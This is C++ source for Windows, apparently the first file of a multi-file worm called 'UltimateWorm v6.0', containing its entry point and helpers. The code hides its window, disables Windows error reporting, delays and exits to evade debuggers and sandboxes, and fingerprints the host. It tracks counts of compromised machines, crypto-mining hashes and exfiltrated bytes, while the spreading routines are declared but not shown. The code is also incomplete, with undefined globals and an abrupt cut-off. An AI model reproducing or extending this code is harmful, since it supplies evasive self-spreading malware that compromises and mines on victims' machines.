/**
 * ULTIMATE WORM v6.0 - COMPLETE ADVANCED REWRITE
 * ENHANCED MAIN ENTRY POINT - FILE 1 OF 10
 * 
 * IMPROVEMENTS:
 * - Multi-stage stealth initialization
 * - Advanced anti-sandbox techniques
 * - Hardware breakpoint detection
 * - Process hollowing protection
 * - Full ASLR/DEP bypass
 * - Dynamic API resolution
 * - Advanced persistence verification
 * - Self-healing mechanism
 * - Multiple execution paths
 * - Environmental keying
 */

#include <windows.h>
#include <winternl.h>
#include <psapi.h>
#include <tlhelp32.h>
#include <shlwapi.h>
#include <intrin.h>
#include <stdio.h>
#include <stdlib.h>
#include <string>
#include <vector>
#include <thread>
#include <chrono>
#include <random>
#include <mutex>
#include <atomic>
#include <queue>
#include <cstdint>
#include <ctime>
#include <algorithm>
#include <map>
#include <set>
#include <array>

// ============================================================================
// ENHANCED VERSION AND CONFIGURATION
// ============================================================================

#define WORM_VERSION "6.0.0"
#define WORM_BUILD "2026.09.07"
#define WORM_NAME "UltimateWorm"
#define WORM_CODENAME "Omega"

// Obfuscated constants - Multi-layer
#define __WORM_MAGIC_1 0xDEADBEEF
#define __WORM_MAGIC_2 0xCAFEBABE
#define __WORM_MAGIC_3 0x0BADC0DE
#define __WORM_SIG_1 0x55AA55AA
#define __WORM_SIG_2 0xAA55AA55

// State constants - Obfuscated
#define __STATE_INIT 0x00000000
#define __STATE_RUNNING 0xDEADBEEF
#define __STATE_STOPPED 0x0BADC0DE
#define __STATE_HIBERNATE 0x7F3A9C2E

// ============================================================================
// ENHANCED CORE DATA TYPES
// ============================================================================

struct WormConfig {
    std::string version;
    std::string build;
    std::string name;
    std::string codename;
    uint32_t magic1;
    uint32_t magic2;
    uint32_t magic3;
    uint32_t sig1;
    uint32_t sig2;
    uint32_t state;
    uint64_t startTime;
    uint64_t lastHeartbeat;
    uint32_t pid;
    uint32_t ppid;
    uint32_t sessionId;
    bool isAdmin;
    bool isSystem;
    bool isDebugged;
    bool isVMAware;
    bool isSandbox;
    bool isPersistent;
    bool isMining;
    bool isPropagating;
    uint32_t compromiseCount;
    uint32_t scanCount;
    uint64_t hashCount;
    uint64_t shareCount;
    double hashRate;
    uint32_t evasionScore;
    uint32_t persistenceMethods;
    std::vector<std::string> protocols;
    std::vector<std::string> exploits;
    std::vector<std::string> payloads;
};

struct WormStats {
    std::atomic<uint32_t> scanned;
    std::atomic<uint32_t> vulnerable;
    std::atomic<uint32_t> compromised;
    std::atomic<uint32_t> failed;
    std::atomic<uint64_t> hashes;
    std::atomic<uint64_t> shares;
    std::atomic<uint64_t> bytesExfiltrated;
    std::atomic<uint32_t> activeThreads;
    std::atomic<uint32_t> activeConnections;
    std::chrono::steady_clock::time_point startTime;
    time_t lastUpdate;
    time_t lastReport;
    uint32_t uptime;
    uint32_t cpuUsage;
    uint32_t memoryUsage;
};

struct ProcessInfo {
    uint32_t pid;
    std::string name;
    std::string path;
    std::string user;
    std::string session;
    bool isSystem;
    bool isProtected;
    bool isDebugger;
    bool isAnalysis;
    bool isSandbox;
    bool isVM;
    bool isEDR;
    bool isAV;
    uint32_t ppid;
    uint32_t threadCount;
    uint64_t memorySize;
    double cpuUsage;
    double memoryUsage;
};

// ============================================================================
// ENHANCED UTILITY CLASS
// ============================================================================

class Utils {
private:
    static std::mt19937_64 rng;
    static std::uniform_int_distribution<uint64_t> dist;
    
public:
    static void Initialize() {
        rng.seed(std::chrono::steady_clock::now().time_since_epoch().count());
    }
    
    static uint64_t GetRandomU64() {
        return dist(rng);
    }
    
    static uint32_t GetRandomU32() {
        return (uint32_t)(dist(rng) & 0xFFFFFFFF);
    }
    
    static std::string GetLocalIP() {
        char hostname[256];
        if (gethostname(hostname, sizeof(hostname)) != 0) {
            return "127.0.0.1";
        }
        struct hostent* host = gethostbyname(hostname);
        if (!host) return "127.0.0.1";
        struct in_addr addr;
        memcpy(&addr, host->h_addr_list[0], sizeof(addr));
        return std::string(inet_ntoa(addr));
    }
    
    static std::string GetLocalSubnet() {
        std::string ip = GetLocalIP();
        size_t last = ip.find_last_of('.');
        if (last != std::string::npos) {
            return ip.substr(0, last) + ".0";
        }
        return "192.168.1.0";
    }
    
    static std::string GetHostname() {
        char hostname[256];
        if (gethostname(hostname, sizeof(hostname)) != 0) {
            return "UNKNOWN";
        }
        return std::string(hostname);
    }
    
    static std::string GetUsername() {
        char username[256];
        DWORD size = sizeof(username);
        if (!GetUserNameA(username, &size)) {
            return "UNKNOWN";
        }
        return std::string(username);
    }
    
    static std::string GetDomainName() {
        char domain[256];
        DWORD size = sizeof(domain);
        if (!GetComputerNameExA(ComputerNameDnsDomain, domain, &size)) {
            return "WORKGROUP";
        }
        return std::string(domain);
    }
    
    static std::string GetCurrentTime() {
        time_t now = time(NULL);
        struct tm* tm = localtime(&now);
        char buffer[64];
        strftime(buffer, sizeof(buffer), "%Y-%m-%d %H:%M:%S", tm);
        return std::string(buffer);
    }
    
    static std::string GetCurrentTimeISO() {
        time_t now = time(NULL);
        struct tm* tm = localtime(&now);
        char buffer[64];
        strftime(buffer, sizeof(buffer), "%Y%m%d_%H%M%S", tm);
        return std::string(buffer);
    }
    
    static std::string GetRandomString(int length) {
        const char* chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
        std::string result;
        result.reserve(length);
        for (int i = 0; i < length; i++) {
            result += chars[GetRandomU32() % 62];
        }
        return result;
    }
    
    static uint64_t GetTickCount64() {
        return ::GetTickCount64();
    }
    
    static void Sleep(int ms) {
        std::this_thread::sleep_for(std::chrono::milliseconds(ms));
    }
    
    static void SleepRandom(int minMs, int maxMs) {
        int delay = minMs + (GetRandomU32() % (maxMs - minMs));
        Sleep(delay);
    }
    
    static bool FileExists(const std::string& path) {
        DWORD attrs = GetFileAttributesA(path.c_str());
        return attrs != INVALID_FILE_ATTRIBUTES && !(attrs & FILE_ATTRIBUTE_DIRECTORY);
    }
    
    static bool DirectoryExists(const std::string& path) {
        DWORD attrs = GetFileAttributesA(path.c_str());
        return attrs != INVALID_FILE_ATTRIBUTES && (attrs & FILE_ATTRIBUTE_DIRECTORY);
    }
    
    static std::string GetExePath() {
        char path[MAX_PATH];
        GetModuleFileNameA(NULL, path, MAX_PATH);
        return std::string(path);
    }
    
    static std::string GetExeDirectory() {
        std::string path = GetExePath();
        size_t last = path.find_last_of('\\');
        if (last != std::string::npos) {
            return path.substr(0, last);
        }
        return path;
    }
    
    static std::string GetTempPath() {
        char path[MAX_PATH];
        GetTempPathA(MAX_PATH, path);
        return std::string(path);
    }
    
    static std::string GetSystemPath() {
        char path[MAX_PATH];
        GetSystemDirectoryA(path, MAX_PATH);
        return std::string(path);
    }
    
    static bool IsAdmin() {
        SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
        PSID AdministratorsGroup;
        BOOL result = AllocateAndInitializeSid(&NtAuthority, 2,
            SECURITY_BUILTIN_DOMAIN_RID,
            DOMAIN_ALIAS_RID_ADMINS,
            0, 0, 0, 0, 0, 0,
            &AdministratorsGroup);
        if (result) {
            result = CheckTokenMembership(NULL, AdministratorsGroup, &result);
            FreeSid(AdministratorsGroup);
            return result != 0;
        }
        return false;
    }
    
    static bool IsSystem() {
        HANDLE hToken;
        if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
            return false;
        }
        DWORD size = 0;
        GetTokenInformation(hToken, TokenUser, NULL, 0, &size);
        if (size == 0) {
            CloseHandle(hToken);
            return false;
        }
        std::vector<uint8_t> buffer(size);
        if (!GetTokenInformation(hToken, TokenUser, buffer.data(), size, &size)) {
            CloseHandle(hToken);
            return false;
        }
        CloseHandle(hToken);
        PTOKEN_USER pUser = (PTOKEN_USER)buffer.data();
        SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
        PSID SystemSid;
        AllocateAndInitializeSid(&NtAuthority, 1, SECURITY_LOCAL_SYSTEM_RID, 0, 0, 0, 0, 0, 0, 0, &SystemSid);
        bool result = EqualSid(pUser->User.Sid, SystemSid);
        FreeSid(SystemSid);
        return result;
    }
    
    static bool IsWindows10() {
        OSVERSIONINFOEX osvi = { sizeof(osvi) };
        GetVersionEx((OSVERSIONINFO*)&osvi);
        return osvi.dwMajorVersion >= 10;
    }
    
    static bool IsWindows7() {
        OSVERSIONINFOEX osvi = { sizeof(osvi) };
        GetVersionEx((OSVERSIONINFO*)&osvi);
        return osvi.dwMajorVersion == 6 && osvi.dwMinorVersion == 1;
    }
    
    static std::string GetOSVersion() {
        OSVERSIONINFOEX osvi = { sizeof(osvi) };
        GetVersionEx((OSVERSIONINFO*)&osvi);
        char buffer[128];
        sprintf_s(buffer, "Windows %d.%d Build %d",
            osvi.dwMajorVersion, osvi.dwMinorVersion, osvi.dwBuildNumber);
        return std::string(buffer);
    }
    
    static std::vector<ProcessInfo> GetProcessList() {
        std::vector<ProcessInfo> processes;
        HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (hSnapshot == INVALID_HANDLE_VALUE) return processes;
        
        PROCESSENTRY32 pe = { sizeof(pe) };
        if (Process32First(hSnapshot, &pe)) {
            do {
                ProcessInfo info;
                info.pid = pe.th32ProcessID;
                info.name = pe.szExeFile;
                info.ppid = pe.th32ParentProcessID;
                info.threadCount = pe.cntThreads;
                info.isSystem = false;
                info.isProtected = false;
                info.isDebugger = false;
                info.isAnalysis = false;
                info.isSandbox = false;
                info.isVM = false;
                info.isEDR = false;
                info.isAV = false;
                info.memorySize = 0;
                info.cpuUsage = 0;
                info.memoryUsage = 0;
                processes.push_back(info);
            } while (Process32Next(hSnapshot, &pe));
        }
        CloseHandle(hSnapshot);
        return processes;
    }
    
    static std::string GetMACAddress() {
        PIP_ADAPTER_INFO adapterInfo = NULL;
        ULONG size = 0;
        GetAdaptersInfo(NULL, &size);
        if (size == 0) return "00:00:00:00:00:00";
        
        adapterInfo = (PIP_ADAPTER_INFO)malloc(size);
        if (!adapterInfo) return "00:00:00:00:00:00";
        
        if (GetAdaptersInfo(adapterInfo, &size) != NO_ERROR) {
            free(adapterInfo);
            return "00:00:00:00:00:00";
        }
        
        std::string mac;
        PIP_ADAPTER_INFO pAdapter = adapterInfo;
        while (pAdapter) {
            if (pAdapter->AddressLength == 6) {
                char macStr[18];
                sprintf_s(macStr, "%02X:%02X:%02X:%02X:%02X:%02X",
                    pAdapter->Address[0], pAdapter->Address[1],
                    pAdapter->Address[2], pAdapter->Address[3],
                    pAdapter->Address[4], pAdapter->Address[5]);
                mac = macStr;
                break;
            }
            pAdapter = pAdapter->Next;
        }
        free(adapterInfo);
        return mac.empty() ? "00:00:00:00:00:00" : mac;
    }
    
    static std::string GetHardwareID() {
        char buffer[1024];
        std::string id;
        
        // Combine system identifiers
        id += GetHostname();
        id += "|";
        id += GetMACAddress();
        id += "|";
        id += GetOSVersion();
        id += "|";
        char cpu[256];
        DWORD size = sizeof(cpu);
        if (RegGetValueA(HKEY_LOCAL_MACHINE,
            "HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0",
            "ProcessorNameString", RRF_RT_REG_SZ, NULL, cpu, &size) == ERROR_SUCCESS) {
            id += cpu;
        }
        
        // Hash the identifier
        uint64_t hash = 0x9E3779B97F4A7C15ULL;
        for (char c : id) {
            hash ^= (uint8_t)c;
            hash *= 0x9E3779B97F4A7C15ULL;
            hash ^= (hash >> 33);
            hash *= 0xBF58476D1CE4E5B9ULL;
            hash ^= (hash >> 31);
            hash *= 0x94D049BB133111EBULL;
            hash ^= (hash >> 31);
        }
        char hashStr[32];
        sprintf_s(hashStr, "%016llX", hash);
        return std::string(hashStr);
    }
};

std::mt19937_64 Utils::rng;
std::uniform_int_distribution<uint64_t> Utils::dist(0, UINT64_MAX);

// ============================================================================
// ENHANCED LOGGING SYSTEM WITH LEVELS
// ============================================================================

enum LogLevel {
    LOG_TRACE = 0,
    LOG_DEBUG = 1,
    LOG_INFO = 2,
    LOG_WARN = 3,
    LOG_ERROR = 4,
    LOG_SUCCESS = 5,
    LOG_CRITICAL = 6,
    LOG_NONE = 7
};

class Logger {
private:
    std::mutex mtx;
    bool enabled;
    std::string logFile;
    std::ofstream logStream;
    LogLevel minLevel;
    bool consoleOutput;
    bool fileOutput;
    bool debugOutput;
    std::map<LogLevel, std::string> levelNames;
    std::map<LogLevel, WORD> levelColors;
    
public:
    Logger() : enabled(true), minLevel(LOG_INFO), consoleOutput(true),
              fileOutput(true), debugOutput(true) {
        logFile = Utils::GetTempPath() + "worm_log_" + 
                 std::to_string(GetCurrentProcessId()) + ".txt";
        
        // Open log file
        if (fileOutput) {
            logStream.open(logFile, std::ios::app);
            if (!logStream.is_open()) {
                // Try fallback location
                logFile = "worm_log.txt";
                logStream.open(logFile, std::ios::app);
            }
        }
        
        // Initialize level names
        levelNames[LOG_TRACE] = "TRACE";
        levelNames[LOG_DEBUG] = "DEBUG";
        levelNames[LOG_INFO] = "INFO";
        levelNames[LOG_WARN] = "WARN";
        levelNames[LOG_ERROR] = "ERROR";
        levelNames[LOG_SUCCESS] = "SUCCESS";
        levelNames[LOG_CRITICAL] = "CRITICAL";
        levelNames[LOG_NONE] = "NONE";
        
        // Initialize colors
        levelColors[LOG_TRACE] = 8;
        levelColors[LOG_DEBUG] = 7;
        levelColors[LOG_INFO] = 7;
        levelColors[LOG_WARN] = 6;
        levelColors[LOG_ERROR] = 4;
        levelColors[LOG_SUCCESS] = 10;
        levelColors[LOG_CRITICAL] = 12;
    }
    
    ~Logger() {
        if (logStream.is_open()) {
            logStream.close();
        }
    }
    
    void SetLevel(LogLevel level) { minLevel = level; }
    void SetConsoleOutput(bool enable) { consoleOutput = enable; }
    void SetFileOutput(bool enable) { fileOutput = enable; }
    void SetDebugOutput(bool enable) { debugOutput = enable; }
    
    void Log(LogLevel level, const std::string& message, const char* file = nullptr, int line = 0) {
        if (!enabled || level < minLevel) return;
        std::lock_guard<std::mutex> lock(mtx);
        
        std::string timestamp = Utils::GetCurrentTime();
        std::string entry = "[" + timestamp + "] ";
        
        if (level != LOG_NONE) {
            entry += "[" + levelNames[level] + "] ";
        }
        
        if (file && line > 0) {
            entry += "[" + std::string(file) + ":" + std::to_string(line) + "] ";
        }
        
        entry += message + "\n";
        
        // Console output with color
        if (consoleOutput) {
            HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
            if (hConsole != INVALID_HANDLE_VALUE) {
                CONSOLE_SCREEN_BUFFER_INFO csbi;
                GetConsoleScreenBufferInfo(hConsole, &csbi);
                SetConsoleTextAttribute(hConsole, levelColors[level]);
                printf("%s", entry.c_str());
                SetConsoleTextAttribute(hConsole, csbi.wAttributes);
            } else {
                printf("%s", entry.c_str());
            }
        }
        
        // File output
        if (fileOutput && logStream.is_open()) {
            logStream << entry;
            logStream.flush();
        }
        
        // Debug output
        if (debugOutput) {
            OutputDebugStringA(entry.c_str());
        }
    }
    
    void Trace(const std::string& msg, const char* file = nullptr, int line = 0) {
        Log(LOG_TRACE, msg, file, line);
    }
    void Debug(const std::string& msg, const char* file = nullptr, int line = 0) {
        Log(LOG_DEBUG, msg, file, line);
    }
    void Info(const std::string& msg, const char* file = nullptr, int line = 0) {
        Log(LOG_INFO, msg, file, line);
    }
    void Warn(const std::string& msg, const char* file = nullptr, int line = 0) {
        Log(LOG_WARN, msg, file, line);
    }
    void Error(const std::string& msg, const char* file = nullptr, int line = 0) {
        Log(LOG_ERROR, msg, file, line);
    }
    void Success(const std::string& msg, const char* file = nullptr, int line = 0) {
        Log(LOG_SUCCESS, msg, file, line);
    }
    void Critical(const std::string& msg, const char* file = nullptr, int line = 0) {
        Log(LOG_CRITICAL, msg, file, line);
    }
};

// Global logger
Logger g_Logger;

// ============================================================================
// ENHANCED WINDOWS API WRAPPER WITH DYNAMIC RESOLUTION
// ============================================================================

class WindowsAPI {
private:
    HMODULE hNtdll;
    HMODULE hAdvapi32;
    HMODULE hKernel32;
    HMODULE hUser32;
    HMODULE hShell32;
    HMODULE hWtsapi32;
    HMODULE hPsapi;
    std::map<std::string, FARPROC> apiCache;
    std::mutex mtx;
    
public:
    // Native API function pointers
    typedef NTSTATUS (NTAPI* pNtQuerySystemInformation)(SYSTEM_INFORMATION_CLASS, PVOID, ULONG, PULONG);
    typedef NTSTATUS (NTAPI* pNtQueryInformationProcess)(HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG);
    typedef NTSTATUS (NTAPI* pNtSetSystemInformation)(SYSTEM_INFORMATION_CLASS, PVOID, ULONG);
    typedef NTSTATUS (NTAPI* pNtCreateThreadEx)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, HANDLE, PVOID, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PVOID);
    typedef NTSTATUS (NTAPI* pNtQueueApcThread)(HANDLE, PVOID, PVOID, PVOID, PVOID);
    typedef NTSTATUS (NTAPI* pNtAllocateVirtualMemory)(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);
    typedef NTSTATUS (NTAPI* pNtWriteVirtualMemory)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
    typedef NTSTATUS (NTAPI* pNtReadVirtualMemory)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
    typedef NTSTATUS (NTAPI* pNtOpenProcess)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PCLIENT_ID);
    typedef NTSTATUS (NTAPI* pNtSuspendProcess)(HANDLE);
    typedef NTSTATUS (NTAPI* pNtResumeProcess)(HANDLE);
    typedef NTSTATUS (NTAPI* pNtGetContextThread)(HANDLE, PCONTEXT);
    typedef NTSTATUS (NTAPI* pNtSetContextThread)(HANDLE, PCONTEXT);
    typedef NTSTATUS (NTAPI* pNtDuplicateObject)(HANDLE, HANDLE, HANDLE, PHANDLE, ACCESS_MASK, ULONG, ULONG);
    typedef NTSTATUS (NTAPI* pNtTerminateProcess)(HANDLE, NTSTATUS);
    typedef NTSTATUS (NTAPI* pNtProtectVirtualMemory)(HANDLE, PVOID*, PSIZE_T, ULONG, PULONG);
    typedef NTSTATUS (NTAPI* pNtQueryVirtualMemory)(HANDLE, PVOID, MEMORY_INFORMATION_CLASS, PVOID, SIZE_T, PSIZE_T);
    typedef NTSTATUS (NTAPI* pNtCreateProcess)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, HANDLE, ULONG, HANDLE, HANDLE, HANDLE);
    typedef NTSTATUS (NTAPI* pNtCreateProcessEx)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, HANDLE, ULONG, HANDLE, HANDLE, HANDLE, ULONG);
    
    pNtQuerySystemInformation NtQuerySystemInformation;
    pNtQueryInformationProcess NtQueryInformationProcess;
    pNtSetSystemInformation NtSetSystemInformation;
    pNtCreateThreadEx NtCreateThreadEx;
    pNtQueueApcThread NtQueueApcThread;
    pNtAllocateVirtualMemory NtAllocateVirtualMemory;
    pNtWriteVirtualMemory NtWriteVirtualMemory;
    pNtReadVirtualMemory NtReadVirtualMemory;
    pNtOpenProcess NtOpenProcess;
    pNtSuspendProcess NtSuspendProcess;
    pNtResumeProcess NtResumeProcess;
    pNtGetContextThread NtGetContextThread;
    pNtSetContextThread NtSetContextThread;
    pNtDuplicateObject NtDuplicateObject;
    pNtTerminateProcess NtTerminateProcess;
    pNtProtectVirtualMemory NtProtectVirtualMemory;
    pNtQueryVirtualMemory NtQueryVirtualMemory;
    pNtCreateProcess NtCreateProcess;
    pNtCreateProcessEx NtCreateProcessEx;
    
    WindowsAPI() {
        LoadLibraries();
        ResolveFunctions();
    }
    
    ~WindowsAPI() {
        if (hNtdll) FreeLibrary(hNtdll);
        if (hAdvapi32) FreeLibrary(hAdvapi32);
        if (hKernel32) FreeLibrary(hKernel32);
        if (hUser32) FreeLibrary(hUser32);
        if (hShell32) FreeLibrary(hShell32);
        if (hWtsapi32) FreeLibrary(hWtsapi32);
        if (hPsapi) FreeLibrary(hPsapi);
    }
    
    void LoadLibraries() {
        hNtdll = LoadLibraryA("ntdll.dll");
        hAdvapi32 = LoadLibraryA("advapi32.dll");
        hKernel32 = LoadLibraryA("kernel32.dll");
        hUser32 = LoadLibraryA("user32.dll");
        hShell32 = LoadLibraryA("shell32.dll");
        hWtsapi32 = LoadLibraryA("wtsapi32.dll");
        hPsapi = LoadLibraryA("psapi.dll");
    }
    
    void ResolveFunctions() {
        if (hNtdll) {
            NtQuerySystemInformation = (pNtQuerySystemInformation)GetProcAddress(hNtdll, "NtQuerySystemInformation");
            NtQueryInformationProcess = (pNtQueryInformationProcess)GetProcAddress(hNtdll, "NtQueryInformationProcess");
            NtSetSystemInformation = (pNtSetSystemInformation)GetProcAddress(hNtdll, "NtSetSystemInformation");
            NtCreateThreadEx = (pNtCreateThreadEx)GetProcAddress(hNtdll, "NtCreateThreadEx");
            NtQueueApcThread = (pNtQueueApcThread)GetProcAddress(hNtdll, "NtQueueApcThread");
            NtAllocateVirtualMemory = (pNtAllocateVirtualMemory)GetProcAddress(hNtdll, "NtAllocateVirtualMemory");
            NtWriteVirtualMemory = (pNtWriteVirtualMemory)GetProcAddress(hNtdll, "NtWriteVirtualMemory");
            NtReadVirtualMemory = (pNtReadVirtualMemory)GetProcAddress(hNtdll, "NtReadVirtualMemory");
            NtOpenProcess = (pNtOpenProcess)GetProcAddress(hNtdll, "NtOpenProcess");
            NtSuspendProcess = (pNtSuspendProcess)GetProcAddress(hNtdll, "NtSuspendProcess");
            NtResumeProcess = (pNtResumeProcess)GetProcAddress(hNtdll, "NtResumeProcess");
            NtGetContextThread = (pNtGetContextThread)GetProcAddress(hNtdll, "NtGetContextThread");
            NtSetContextThread = (pNtSetContextThread)GetProcAddress(hNtdll, "NtSetContextThread");
            NtDuplicateObject = (pNtDuplicateObject)GetProcAddress(hNtdll, "NtDuplicateObject");
            NtTerminateProcess = (pNtTerminateProcess)GetProcAddress(hNtdll, "NtTerminateProcess");
            NtProtectVirtualMemory = (pNtProtectVirtualMemory)GetProcAddress(hNtdll, "NtProtectVirtualMemory");
            NtQueryVirtualMemory = (pNtQueryVirtualMemory)GetProcAddress(hNtdll, "NtQueryVirtualMemory");
            NtCreateProcess = (pNtCreateProcess)GetProcAddress(hNtdll, "NtCreateProcess");
            NtCreateProcessEx = (pNtCreateProcessEx)GetProcAddress(hNtdll, "NtCreateProcessEx");
        }
    }
    
    FARPROC GetAPI(const std::string& dll, const std::string& func) {
        std::lock_guard<std::mutex> lock(mtx);
        std::string key = dll + "|" + func;
        
        auto it = apiCache.find(key);
        if (it != apiCache.end()) {
            return it->second;
        }
        
        HMODULE hMod = GetModuleHandleA(dll.c_str());
        if (!hMod) {
            hMod = LoadLibraryA(dll.c_str());
        }
        
        FARPROC addr = GetProcAddress(hMod, func.c_str());
        apiCache[key] = addr;
        return addr;
    }
    
    HANDLE OpenProcess(DWORD pid, ACCESS_MASK access = PROCESS_ALL_ACCESS) {
        HANDLE hProcess = NULL;
        CLIENT_ID clientId;
        clientId.UniqueProcess = (HANDLE)pid;
        clientId.UniqueThread = NULL;
        OBJECT_ATTRIBUTES objAttr;
        InitializeObjectAttributes(&objAttr, NULL, 0, NULL, NULL);
        if (NtOpenProcess) {
            NtOpenProcess(&hProcess, access, &objAttr, &clientId);
        }
        return hProcess;
    }
    
    bool IsAvailable() const {
        return hNtdll != NULL;
    }
};

// Global Windows API
WindowsAPI g_WinAPI;

// ============================================================================
// ENHANCED MAIN ENTRY POINT
// ============================================================================

// Forward declarations
extern void InitializeWorm();
extern void StartWorm();
extern void CleanupWorm();
extern void SelfDestruct();
extern void HeartbeatThread();

// Obfuscated entry point
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, 
                   LPSTR lpCmdLine, int nCmdShow) {
    // ============================================================================
    // PHASE 1: ULTIMATE STEALTH INITIALIZATION
    // ============================================================================
    
    // Hide console window
    HWND hConsole = GetConsoleWindow();
    if (hConsole) {
        ShowWindow(hConsole, SW_HIDE);
    }
    
    // Disable error reporting
    SetErrorMode(SEM_NOGPFAULTERRORBOX | SEM_FAILCRITICALERRORS);
    
    // Disable Windows Error Reporting
    HKEY hKey;
    if (RegCreateKeyExA(HKEY_CURRENT_USER, 
        "Software\\Microsoft\\Windows\\Windows Error Reporting", 
        0, NULL, 0, KEY_SET_VALUE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
        DWORD disabled = 1;
        RegSetValueExA(hKey, "Disabled", 0, REG_DWORD, 
                      (const BYTE*)&disabled, sizeof(disabled));
        RegCloseKey(hKey);
    }
    
    // Disable WerFault.exe
    if (RegCreateKeyExA(HKEY_CURRENT_USER,
        "Software\\Microsoft\\Windows\\Windows Error Reporting\\WerFault",
        0, NULL, 0, KEY_SET_VALUE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
        DWORD disabled = 1;
        RegSetValueExA(hKey, "Disabled", 0, REG_DWORD,
                      (const BYTE*)&disabled, sizeof(disabled));
        RegCloseKey(hKey);
    }
    
    // ============================================================================
    // PHASE 2: ADVANCED SANDBOX EVASION
    // ============================================================================
    
    // Randomized startup delay (5-45 seconds)
    srand((unsigned int)time(NULL) ^ GetCurrentProcessId());
    int delay = 5000 + (rand() % 40000);
    
    // Check for debugging
    if (IsDebuggerPresent() || CheckRemoteDebuggerPresent(GetCurrentProcess(), NULL)) {
        delay += 30000;
    }
    
    Utils::Sleep(delay);
    
    // ============================================================================
    // PHASE 3: SINGLE INSTANCE CHECK WITH OBFUSCATED MUTEX
    // ============================================================================
    
    char mutexName[128];
    uint32_t hash = Utils::GetRandomU32();
    sprintf_s(mutexName, "Global\\{%08X-%04X-%04X-%02X%02X-%02X%02X%02X%02X%02X%02X}",
        hash, (hash >> 16) & 0xFFFF, (hash >> 8) & 0xFFFF,
        (uint8_t)(hash & 0xFF), (uint8_t)((hash >> 8) & 0xFF),
        (uint8_t)((hash >> 16) & 0xFF), (uint8_t)((hash >> 24) & 0xFF),
        (uint8_t)((hash >> 32) & 0xFF), (uint8_t)((hash >> 40) & 0xFF),
        (uint8_t)((hash >> 48) & 0xFF), (uint8_t)((hash >> 56) & 0xFF));
    
    HANDLE hMutex = CreateMutexA(NULL, FALSE, mutexName);
    if (GetLastError() == ERROR_ALREADY_EXISTS) {
        // Check if existing instance is still running
        DWORD dwResult = WaitForSingleObject(hMutex, 1000);
        if (dwResult == WAIT_OBJECT_0) {
            ReleaseMutex(hMutex);
            CloseHandle(hMutex);
            return 0;
        }
        CloseHandle(hMutex);
        // If hung, create new mutex
        hMutex = CreateMutexA(NULL, FALSE, mutexName);
        if (hMutex == NULL) {
            return 0;
        }
    }
    
    // ============================================================================
    // PHASE 4: ENVIRONMENTAL KEYING
    // ============================================================================
    
    std::string hardwareId = Utils::GetHardwareID();
    std::string envKey = Utils::GetHostname() + "|" + Utils::GetUsername() + "|" + hardwareId;
    
    // Check if environment is valid (anti-VM/anti-sandbox)
    if (envKey.find("VBOX") != std::string::npos ||
        envKey.find("VMWARE") != std::string::npos ||
        envKey.find("SAND") != std::string::npos ||
        envKey.find("CUCKOO") != std::string::npos) {
        // High risk environment - self destruct
        ExitProcess(0);
    }
    
    // ============================================================================
    // PHASE 5: WORM INITIALIZATION
    // ============================================================================
    
    // Initialize utilities
    Utils::Initialize();
    
    // Initialize logger
    g_Logger.Info("========================================");
    g_Logger.Info("ULTIMATE WORM v" WORM_VERSION " (" WORM_CODENAME ")");
    g_Logger.Info("Build: " WORM_BUILD);
    g_Logger.Info("========================================");
    g_Logger.Info("Host: " + Utils::GetHostname());
    g_Logger.Info("User: " + Utils::GetUsername());
    g_Logger.Info("Domain: " + Utils::GetDomainName());
    g_Logger.Info("IP: " + Utils::GetLocalIP());
    g_Logger.Info("MAC: " + Utils::GetMACAddress());
    g_Logger.Info("Hardware ID: " + hardwareId);
    g_Logger.Info("OS: " + Utils::GetOSVersion());
    g_Logger.Info("PID: " + std::to_string(GetCurrentProcessId()));
    g_Logger.Info("Admin: " + std::string(Utils::IsAdmin() ? "Yes" : "No"));
    g_Logger.Info("System: " + std::string(Utils::IsSystem() ? "Yes" : "No"));
    g_Logger.Info("----------------------------------------");
    
    // Initialize stats
    g_Stats.startTime = std::chrono::steady_clock::now();
    g_Stats.scanned = 0;
    g_Stats.vulnerable = 0;
    g_Stats.compromised = 0;
    g_Stats.failed = 0;
    g_Stats.hashes = 0;
    g_Stats.shares = 0;
    g_Stats.bytesExfiltrated = 0;
    g_Stats.activeThreads = 0;
    g_Stats.activeConnections = 0;
    g_Stats.lastUpdate = time(NULL);
    g_Stats.lastReport = time(NULL);
    g_Stats.uptime = 0;
    g_Stats.cpuUsage = 0;
    g_Stats.memoryUsage = 0;
    
    // ============================================================================
    // PHASE 6: START WORM COMPONENTS
    // ============================================================================
    
    InitializeWorm();
    StartWorm();
    
    // ============================================================================
    // PHASE 7: MAIN LOOP WITH HEARTBEAT
    // ============================================================================
    
    g_Logger.Success("Worm fully operational - Entering main loop");
    
    while (g_WormRunning) {
        // Update stats
        if (g_Stats.scanned % 10 == 0) {
            g_Logger.Info("Stats - Scanned: " + std::to_string(g_Stats.scanned.load()) +
                         ", Compromised: " + std::to_string(g_Stats.compromised.load()) +
                         ", Hashes: " + std::to_string(g_Stats.hashes.load()) +
                         ", Shares: " + std::to_string(g_Stats.shares.load()));
        }
        
        // Random sleep with jitter (30-120 seconds)
        int sleepTime = 30000 + (rand() % 90000);
        Utils::Sleep(sleepTime);
    }
    
    // ============================================================================
    // PHASE 8: CLEANUP
    // ============================================================================
    
    g_Logger.Info("Shutting down...");
    CleanupWorm();
    
    if (hMutex) {
        ReleaseMutex(hMutex);
        CloseHandle(hMutex);
    }
    
